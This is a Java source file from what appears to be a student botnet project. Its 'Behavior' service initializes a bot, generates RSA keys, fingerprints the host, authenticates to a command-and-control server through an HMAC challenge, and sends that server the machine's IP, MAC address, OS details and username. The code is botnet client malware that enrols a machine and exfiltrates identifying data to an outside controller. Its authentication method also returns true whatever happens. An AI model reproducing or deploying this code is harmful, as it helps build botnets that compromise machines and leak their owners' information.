package cs.sii.bot.action;

import java.io.IOException;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.NoSuchProviderException;
import java.security.SignatureException;
import java.security.spec.InvalidKeySpecException;
import java.util.ArrayList;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;

import org.apache.commons.codec.binary.Base64;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import cs.sii.config.onLoad.Config;
import cs.sii.domain.FileUtil;
import cs.sii.domain.IP;
import cs.sii.domain.Pairs;
import cs.sii.service.connection.AsyncRequest;
import cs.sii.service.connection.NetworkService;
import cs.sii.service.crypto.CryptoPKI;
import cs.sii.service.crypto.CryptoUtils;

@Service
public class Behavior {

	@Autowired
	private Config configEngine;

	@Autowired
	private NetworkService networkService;

	@Autowired
	private AsyncRequest request;

	@Autowired
	private Auth auth;

	@Autowired
	private CryptoPKI pki;

	public Behavior() {
	}

	/**
	 * 
	 */
	public void initializeBot() {
		
		loadInfo();
		if (!configEngine.isCommandandconquerStatus()) {
			// metter controllo ID se ==NULL genera altrimenti riusa
			// TODO salvare ID su properties
			// inserire id univoco nella richiesta
			networkService.firstConnectToMockServerDns();
			// reinserire id univoco nella richiesta
			if (challengeToCommandConquer()) {
				// push info online os
				System.out.println("Bot is Ready");
			} else
				System.out.println("Bot not Ready, authentication failed");
		}else{
			networkService.updateDnsInformation();

		}
	}

	/**
	 * 
	 */
	public void loadInfo() {

		try {
			pki.loadKeyFromFile();
			networkService.loadNetwork();
		} catch (InvalidKeyException | InvalidAlgorithmParameterException | IllegalBlockSizeException
				| BadPaddingException | NoSuchAlgorithmException | NoSuchPaddingException | IOException
				| InvalidKeySpecException e) {
			if ((pki.getPrivRSAKey() == null)||(Base64.encodeBase64String(pki.getPrivRSAKey().getEncoded())==""))
				pki.generateKeyRSA();
			if ((networkService.getIdHash() == null)||(networkService.getIdHash() == ""))
				networkService.getMachineInfo();
			e.printStackTrace();
		}

		// TODO prendi info sistema

		// TODO pusha online info

	}

	private boolean challengeToCommandConquer() {
		System.out.println("IP C&C " + networkService.getCommandConquerIps().getCeCList().get(0).getValue1());
		Pairs<Long, Integer> challenge = request.getChallengeFromCeC(networkService.getIdHash(),networkService.getCommandConquerIps().getCeCList().get(0).getValue1());
		if (challenge != null) {
			String key = auth.generateStringKey(challenge.getValue2());
			String hashMac = auth.generateHmac(challenge.getValue1(), auth.generateSecretKey(key));
			System.out.println(hashMac);				
				String response = request.getResponseFromCeC(networkService.getIdHash(), networkService.getIp(), networkService.getMac(), networkService.getOs(), networkService.getVersionOS(), networkService.getArchOS(), networkService.getUsernameOS(), networkService.getCommandConquerIps().getCeCList().get(0).getValue1(), hashMac);
			System.out.println("La risposta del CeC: " + response);
		}
		return true;
	}

}
